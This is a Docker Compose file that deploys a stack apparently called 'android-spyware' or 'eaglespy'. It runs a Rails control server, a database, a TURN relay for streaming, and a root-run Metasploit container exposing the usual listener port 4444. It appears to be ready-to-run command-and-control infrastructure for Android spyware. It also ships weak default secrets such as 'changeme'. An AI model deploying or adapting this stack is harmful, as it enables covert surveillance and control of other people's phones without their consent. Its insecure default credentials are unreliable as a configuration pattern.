version: '3.8'

services:
  db:
    image: costincanciu/android-spyware-db:latest
    expose:
      - "5432"
    volumes:
      - db:/var/lib/postgresql/data
      - ../backups:/backups
      - ./postgres-wal-config/postgresql.conf:/etc/postgresql/postgresql.conf
    networks:
      - eaglespy-network
    environment:
      POSTGRES_USER: ${POSTGRES_USER:-postgres}
      POSTGRES_PASSWORD: ${POSTGRES_PASSWORD:?Database password must be set in .env}
      POSTGRES_HOST_AUTH_METHOD: scram-sha-256
    command: postgres -c config_file=/etc/postgresql/postgresql.conf
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U ${POSTGRES_USER:-postgres}"]
      interval: 10s
      timeout: 5s
      retries: 5
      start_period: 10s
    deploy:
      resources:
        limits:
          cpus: '2'
          memory: 2G
        reservations:
          cpus: '1'
          memory: 1G
    restart: unless-stopped

  redis:
    image: redis:7-alpine
    container_name: redis
    expose:
      - "6379"
    volumes:
      - redis_data:/data
    networks:
      - eaglespy-network
    command: redis-server --appendonly yes --requirepass "${REDIS_PASSWORD:-changeme}" --maxmemory 512mb --maxmemory-policy allkeys-lru
    environment:
      REDIS_PASSWORD: ${REDIS_PASSWORD:-changeme}
    healthcheck:
      test: ["CMD", "redis-cli", "--no-auth-warning", "-a", "${REDIS_PASSWORD:-changeme}", "ping"]
      interval: 10s
      timeout: 3s
      retries: 3
      start_period: 5s
    deploy:
      resources:
        limits:
          cpus: '0.5'
          memory: 512M
        reservations:
          cpus: '0.25'
          memory: 256M
    restart: unless-stopped

  rails-app:
    image: costincanciu/android-spyware:latest
    depends_on:
      db:
        condition: service_healthy
      redis:
        condition: service_healthy
      metasploit:
        condition: service_started
      coturn:
        condition: service_started
    env_file:
      - ../.env
      - ../.env.tracing
      - ../.env.ai
    ports:
      - "443:443"
    networks:
      - eaglespy-network
    volumes:
      - ../:/app/android-spyware
      - bundle_cache:/usr/local/bundle
      - ./app-rails-server/ssl:/etc/nginx/ssl # Mount SSL certs
    working_dir: /app/android-spyware
    entrypoint: >
      sh -c "set -e && rm -f tmp/pids/server.pid && 
             bundle install && 
             rails db:migrate 2>/dev/null || rails db:setup &&
             WEBPACKER_PRECOMPILE=false rails assets:precompile &&
             nginx -g 'daemon off;' &
             bundle exec rails s -b 0.0.0.0 -p 443 -e production"
    tty: true
    environment:
      ADB_HOST: host.docker.internal
      JAEGER_HOST: jaeger-collector
      JAEGER_PORT: 6831
      OTEL_TRACES_EXPORTER: jaeger
      POSTGRES_USER: ${POSTGRES_USER:-postgres}
      POSTGRES_PASSWORD: ${POSTGRES_PASSWORD:-postgres}
      ANDROIDSPYWARE_DATABASE_PASSWORD: ${POSTGRES_PASSWORD:-postgres}
      ANDROIDSPYWARE_DATABASE_HOST: db
      REDIS_URL: ${REDIS_URL:-redis://:${REDIS_PASSWORD:-changeme}@redis:6379/1}
      RAILS_MASTER_KEY: ${RAILS_MASTER_KEY:?RAILS_MASTER_KEY must be set in .env}
      RAILS_ENV: production
      RAILS_HOST: ${RAILS_HOST:-localhost}
      PRODUCTION_HOST: ${PRODUCTION_HOST:-localhost}
      ADMIN_HOST: ${ADMIN_HOST:-localhost}
      TURN_SERVER: turn:coturn:3478
      TURN_USER: ${TURN_USER:-eaglespy}
      TURN_PASSWORD: ${TURN_PASSWORD:-eaglespy_secret}
      DEVICE_AUTH_TOKEN: ${DEVICE_AUTH_TOKEN:-CHANGE_ME_BEFORE_DEPLOYMENT}
      SECRET_KEY_BASE: ${SECRET_KEY_BASE:-development_secret_key_base_for_testing_only}
      RAILS_MAX_THREADS: "10"
      RAILS_MIN_THREADS: "5"
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:3000/health/live"]
      interval: 30s
      timeout: 10s
      retries: 3
      start_period: 60s
    deploy:
      resources:
        limits:
          cpus: '4'
          memory: 4G
        reservations:
          cpus: '2'
          memory: 2G
      restart_policy:
        condition: on-failure
        delay: 5s
        max_attempts: 3
        window: 120s
    logging:
      driver: "json-file"
      options:
        max-size: "10m"
        max-file: "3"
    restart: unless-stopped

  frontend:
    build:
      context: ../frontend
      dockerfile: Dockerfile
      cache_from:
        - eaglespy-frontend:latest
    image: eaglespy-frontend:latest
    ports:
      - "5173:80"
    depends_on:
      rails-app:
        condition: service_healthy
    networks:
      - eaglespy-network
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost/health"]
      interval: 30s
      timeout: 3s
      retries: 3
      start_period: 10s
    deploy:
      resources:
        limits:
          cpus: '0.5'
          memory: 256M
        reservations:
          cpus: '0.25'
          memory: 128M
    logging:
      driver: "json-file"
      options:
        max-size: "5m"
        max-file: "2"
    restart: unless-stopped

  jaeger:
    image: jaegertracing/all-in-one:1.65
    container_name: jaeger-collector
    environment:
      COLLECTOR_ZIPKIN_HTTP_PORT: 9411
      COLLECTOR_OTLP_ENABLED: "true"
    ports:
      - "6831:6831/udp"
      - "6832:6832/udp"
      - "16686:16686"
      - "14250:14250"
      - "9411:9411"
    networks:
      - eaglespy-network
    labels:
      - "com.example.description=Jaeger tracing collector for android-spyware"
    healthcheck:
      test: ["CMD", "wget", "--quiet", "--tries=1", "--spider", "http://localhost:16686/"]
      interval: 30s
      timeout: 5s
      retries: 3
    deploy:
      resources:
        limits:
          cpus: '1'
          memory: 512M
    restart: unless-stopped

  metasploit:
    container_name: kali_container
    image: costincanciu/android-spyware-msf:latest
    ports:
      - "2222:2222"
      - "4444:4444"
    networks:
      - eaglespy-network
    user: root
    volumes:
      - ../files:/root/files
    deploy:
      resources:
        limits:
          cpus: '2'
          memory: 2G
        reservations:
          cpus: '1'
          memory: 1G
    restart: unless-stopped

  coturn:
    image: coturn/coturn:4.6.3
    container_name: coturn
    ports:
      - "3490:3478"
      - "3490:3478/udp"
      - "49152-49200:49152-49200/udp"
    networks:
      - eaglespy-network
    environment:
      TURN_USER: ${TURN_USER:-eaglespy}
      TURN_PASSWORD: ${TURN_PASSWORD:?TURN password must be set in .env}
    command: >
      -n
      --log-file=stdout
      --min-port=49152
      --max-port=49200
      --fingerprint
      --lt-cred-mech
      --user=${TURN_USER:-eaglespy}:${TURN_PASSWORD:?TURN password must be set in .env}
      --realm=192.168.1.13
      --external-ip=192.168.1.13
      --listening-ip=0.0.0.0
      --no-stun
    healthcheck:
      test: ["CMD", "nc", "-z", "localhost", "3478"]
      interval: 30s
      timeout: 5s
      retries: 3
      start_period: 10s
    deploy:
      resources:
        limits:
          cpus: '1'
          memory: 512M
        reservations:
          cpus: '0.5'
          memory: 256M
    restart: unless-stopped

volumes:
  db:
  redis_data:
  bundle_cache:

networks:
  eaglespy-network:
    driver: bridge
